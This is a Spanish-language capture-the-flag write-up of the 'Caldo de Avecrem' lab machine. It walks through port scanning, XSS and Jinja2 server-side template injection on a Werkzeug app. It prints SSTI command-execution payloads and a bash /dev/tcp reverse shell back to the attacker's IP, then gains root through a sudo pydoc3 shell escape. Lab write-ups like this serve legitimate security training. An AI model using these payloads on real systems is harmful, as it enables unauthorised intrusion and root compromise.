---
title: "Caldo de Avecrem - TheHackerLabs"
date: 2025-05-26
draft: false
slug: "THL-writeup-caldoAvecrem"
excerpt: "Esta fue una máquina un poco complicada. Después de analizar los escaneos, analizamos la página web activa en el puerto 8089, en donde realizamos varias pruebas en un input para determinar si es vulnerable a XSS, resultando positivo. Al ver que ocupa Werkzeug, probamos y descubrimos que la página es vulnerable a Server Side Template Injection (SSTI) en el mismo input vulnerable. Con esta vulnerabilidad, nos mandamos una Reverse Shell y ganamos acceso a la máquina víctima. Revisando los privilegios de nuestro usuario, encontramos que podemos usar el binario pydoc3 como Root. Probando el binario, resulta ser similar al comando man, por lo que nos aprovechamos de esto para aplicar Shell Escape y así nos convertimos en Root."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "Werkzeug", "Web Enumeration", "Server Side Template Injection (SSTI)", "Abusing Sudoers Privileges", "Shell Escape", "Privesc - Shell Escape", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "whatweb"
  - "tcpdump"
  - "nc"
  - "bash"
  - "cat"
  - "grep"
  - "find"
  - "sudo"
  - "pydoc3"
links:
  - "https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/"
  - "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2"
  - "https://docs.python.org/es/3.11/library/pydoc.html"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-caldoAvecrem/caldoAvecrem.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.60
PING 192.168.10.60 (192.168.10.60) 56(84) bytes of data.
64 bytes from 192.168.10.60: icmp_seq=1 ttl=64 time=1.99 ms
64 bytes from 192.168.10.60: icmp_seq=2 ttl=64 time=0.935 ms
64 bytes from 192.168.10.60: icmp_seq=3 ttl=64 time=1.00 ms
64 bytes from 192.168.10.60: icmp_seq=4 ttl=64 time=0.964 ms

--- 192.168.10.60 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3021ms
rtt min/avg/max/mdev = 0.935/1.221/1.986/0.442 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.60 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-26 11:52 CST
Initiating ARP Ping Scan at 11:52
Scanning 192.168.10.60 [1 port]
Completed ARP Ping Scan at 11:52, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:52
Scanning 192.168.10.60 [65535 ports]
Discovered open port 80/tcp on 192.168.10.60
Discovered open port 22/tcp on 192.168.10.60
Discovered open port 8089/tcp on 192.168.10.60
Completed SYN Stealth Scan at 11:52, 9.71s elapsed (65535 total ports)
Nmap scan report for 192.168.10.60
Host is up, received arp-response (0.00069s latency).
Scanned at 2025-05-26 11:52:10 CST for 10s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
8089/tcp open  unknown syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.05 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay 3 puertos abiertos y me da curiosidad el **puerto 8089**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80,8089 192.168.10.60 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-26 11:53 CST
Nmap scan report for 192.168.10.60
Host is up (0.00082s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 9c:e0:78:67:d7:63:23:da:f5:e3:8a:77:00:60:6e:76 (ECDSA)
|_  256 4b:30:12:97:4b:5c:47:11:3c:aa:0b:68:0e:b2:01:1b (ED25519)
80/tcp   open  http    Apache httpd 2.4.57 ((Debian))

|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
8089/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)

|_http-title: Caldo pollo
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.36 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

El **puerto 80** muestra únicamente la página por defecto de **Apache2**.

Y el **puerto 8089** muestra que está utilizando **Werkzeug 2.2.2**, que ya hemos visto algunos ataques a los que es vulnerable.

Adelantándome un poco, no encontraremos nada en la página web del **puerto 80** ni en su código fuente ni aplicando **Fuzzing**.

Entonces, empezaremos por la página web del **puerto 8089**.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Página Web del Puerto 8089 que Utiliza Werkzeug {#werkzeug}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-caldoAvecrem/Captura1.png">
</p>

Parece que es una especie de buscador, donde tenemos un input para escribir lo que queramos y hay un botón que supongo es para que aplique la búsqueda. Además, hay varios mensajes de que no hay nada aquí, aunque parece que sí lo hay.

En este caso, **Wappalizer** no nos reporta nada y, al revisar el código fuente, solamente vemos código simple, es decir, no se utiliza ninguna tecnología como tal.

Veamos si **whatweb** nos reporta algo:
```bash
whatweb http://192.168.10.60:8089
http://192.168.10.60:8089 [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.2.2 Python/3.11.2], IP[192.168.10.60], Python[3.11.2], Title[Caldo pollo], Werkzeug[2.2.2]
```
Bien, podemos ver el uso de **Werkzeug** y la versión de **Python** usada.

El input ya tiene escrito el mensaje **Hola**, veamos qué pasa si le damos a ese botón que dice **No hay nada enserio, no toques**:

<p align="center">
<img src="/assets/images/THL-writeup-caldoAvecrem/Captura2.png">
</p>

El mensaje se está reproduciendo y vemos que se agrega un parámetro en la URL que tiene el mensaje.

Cambiemos el mensaje **Hola** por uno random:

<p align="center">
<img src="/assets/images/THL-writeup-caldoAvecrem/Captura3.png">
</p>

Comprobamos que el parámetro imprime lo que escribamos ahí. Además, parece que no se está aplicando ninguna sanitización.

Entonces, podemos probar si es vulnerable a **XSS**, aplicando el clásico `alert()` de **Javascript** en el input:
```bash
# <script>alert('hackeado')</script>
```

Escríbelo en la URL:

<p align="center">
<img src="/assets/images/THL-writeup-caldoAvecrem/Captura4.png">
</p>

Y envía esa petición:

<p align="center">
<img src="/assets/images/THL-writeup-caldoAvecrem/Captura5.png">
</p>

Funcionó, pues como no se está aplicando ninguna sanitización y sabemos que la página usa **Werkzeug**, es posible que la página sea vulnerable **Server Side Template Injection**.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Server Side Template Injection (SSTI) para Obtener Reverse Shell {#SSTI}

Recordemos que **Werkzeug** trabaja con **Flask**, que a su vez, puede trabajar con el **motor de plantillas Jinja2**, siendo este último vulnerable al **ataque Server Side Template Injection**.

Aquí te dejo un par de blogs que muestran payloads para probar y explotar esta vulnerabilidad:
* <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2" target="_blank">PayloadAllTheThings: jinja2</a>
* <a href="https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/" target="_blank">Flask Jinja2 Pentesting</a>

Prueba una multiplicación en la URL, como la siguiente:

{% raw %}
```bash
{{ 8*7 }}
```
{% endraw %}

Puedes escribirla tal cual en la URL y ve lo que ocurre cuando envías la petición:

<p align="center">
<img src="/assets/images/THL-writeup-caldoAvecrem/Captura6.png">
</p>

Se realizó la operación, eso quiere decir que sí es vulnerable.

Probemos a ejecutar el siguiente comando:

{% raw %}
```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
{% endraw %}

Escríbelo en la URL y observa el resultado cuando envías la petición:

<p align="center">
<img src="/assets/images/THL-writeup-caldoAvecrem/Captura7.png">
</p>

Excelente, se está ejecutando el comando **id**.

Vamos a lanzar una **traza ICMP** a nuestra máquina para ver si es posible la conexión.

Primero, inicia la captura de **paquetes ICMP** con **tcpdump**:
```bash
tcpdump -i eth0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

Ejecuta el siguiente comando desde la URL:
{% raw %}
```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ping -c 2 Tu_IP').read() }}
```
{% endraw %}

Observa si se capturó algo:
```bash
tcpdump -i eth0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
13:00:30.885858 IP 192.168.10.1 > Tu_IP: ICMP echo request, id 6, seq 0, length 64
13:00:30.885889 IP Tu_IP > 192.168.10.1: ICMP echo reply, id 6, seq 0, length 64
13:00:30.890428 IP 192.168.10.1 > Tu_IP: ICMP echo request, id 6, seq 256, length 64
13:00:30.890449 IP Tu_IP > 192.168.10.1: ICMP echo reply, id 6, seq 256, length 64
```
Hay conexión, entonces podemos mandarnos una **Reverse Shell**.

Abre una **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Prueba esta **Reverse Shell** y ejecútala:

{% raw %}
```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >%26 /dev/tcp/Tu_IP/443 0>%261'").read() }}
```
{% endraw %}

Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.10.60] 52308
bash: no se puede establecer el grupo de proceso de terminal (346): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
caldo@CaldoPollo:~$ whoami
whoami
caldo
```
Estamos dentro.

Obtengamos una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z
stty raw -echo; fg

# Paso 3:
reset -> xterm

# Paso 4:
export TERM=xterm
export SHELL=bash
stty rows 51 columns 189
```

Y obtengamos la flag del usuario:
```bash
caldo@CaldoPollo:~$ ls
user.txt
caldo@CaldoPollo:~$ cat user.txt
...
```

## Post Explotación {#Post}

### Escalando Privilegios con Binario pydoc3 - Shell Escape {#Privesc}

Revisando el `/etc/passwd`, no encontramos ningún otro usuario registrado:
```bash
root@CaldoPollo:~# cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
caldo:x:1000:1000::/home/caldo:/bin/bash
```

También podemos buscar si hay algún binario con **permisos SUID** que nos pueda ayudar a escalar privilegios:
```bash
caldo@CaldoPollo:~$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/umount
/usr/bin/mount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
```
No veo alguno que nos sirva.

Curiosamente, podemos ver los privilegios de nuestro usuario sin tener que dar su contraseña:
```bash
caldo@CaldoPollo:~$ sudo -l
Matching Defaults entries for caldo on CaldoPollo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User caldo may run the following commands on CaldoPollo:
    (root) NOPASSWD: /usr/bin/pydoc3
```
Podemos utilizar el **binario pydoc3** como **Root**.

Investiguemos este binario:

| **Herramienta pydoc3** |
|:-----------:|
| *pydoc3 es la herramienta de documentación de Python para la versión 3. Se utiliza para generar documentación en línea a partir de los comentarios de los módulos y funciones de Python. Al igual que pydoc en Python 2, pydoc3 utiliza la función help() para acceder a la documentación* |

Al ejecutarlo, parece que es una herramienta similar al comando **man**, pero para ver/crear documentación de funciones, módulos, paquetes y más de **Python**, justo como lo menciona su descripción:
```bash
caldo@CaldoPollo:~$ sudo /usr/bin/pydoc3
pydoc - the Python documentation tool

pydoc3 <name> ...
    Show text documentation on something.  <name> may be the name of a
    Python keyword, topic, function, module, or package, or a dotted
    reference to a class or function within a module or module in a
    package.  If <name> contains a '/', it is used as the path to a
    Python source file to document. If name is 'keywords', 'topics',
    or 'modules', a listing of these things is displayed.

pydoc3 -k <keyword>
    Search for a keyword in the synopsis lines of all available modules.

pydoc3 -n <hostname>
    Start an HTTP server with the given hostname (default: localhost).

pydoc3 -p <port>
    Start an HTTP server on the given port on the local machine.  Port
    number 0 can be used to get an arbitrary unused port.

pydoc3 -b
    Start an HTTP server on an arbitrary unused port and open a web browser
    to interactively browse documentation.  This option can be used in
    combination with -n and/or -p.

pydoc3 -w <name> ...
    Write out the HTML documentation for a module to a file in the current
    directory.  If <name> contains a '/', it is treated as a filename; if
    it names a directory, documentation is written for all the contents.
```
Quizá existan varias formas en las que podemos abusar de este binario para escalar privilegios.

#### Forma 1: Escapando de Documentación del Módulo OS de Python {#Privesc2}

Probemos a ver el **módulo os**:
```bash
caldo@CaldoPollo:~$ sudo /usr/bin/pydoc3 os
```

<p align="center">
<img src="/assets/images/THL-writeup-caldoAvecrem/Captura8.png">
</p>

Muy bien, parece que sí nos metió al manual del **módulo os**.

Intentemos aplicar **Shell Escape**:

<p align="center">
<img src="/assets/images/THL-writeup-caldoAvecrem/Captura9.png">
</p>

```bash
caldo@CaldoPollo:~$ sudo /usr/bin/pydoc3 os
root@CaldoPollo:/home/caldo# whoami
root
root@CaldoPollo:/home/caldo#
```
Excelente, funcionó.

#### Forma 2: Escapando de Menu de Módulos de pydoc3 {#Privesc3}

Otra forma que podemos aplicar **Shell Escape** es, usando el parámetro **b** y eligiendo un puerto random:
```bash
caldo@CaldoPollo:~$ sudo /usr/bin/pydoc3 -b 8080
```

Esto nos metió en un menú que nos muestra los módulos para **Python**:

<p align="center">
<img src="/assets/images/THL-writeup-caldoAvecrem/Captura10.png">
</p>

Desde aquí, podemos aplicar el **Shell Escape**:

<p align="center">
<img src="/assets/images/THL-writeup-caldoAvecrem/Captura11.png">
</p>

Y volvemos a ser **Root**:
```bash
caldo@CaldoPollo:~$ sudo /usr/bin/pydoc3 -b 8080
.
root@CaldoPollo:/home/caldo# whoami
root
```

Ya solo falta buscar la última flag:
```bash
root@CaldoPollo:/home/caldo# cd /root
root@CaldoPollo:~# ls
root.txt
root@CaldoPollo:~# cat root.txt
...
```
Y con esto, terminamos la máquina.
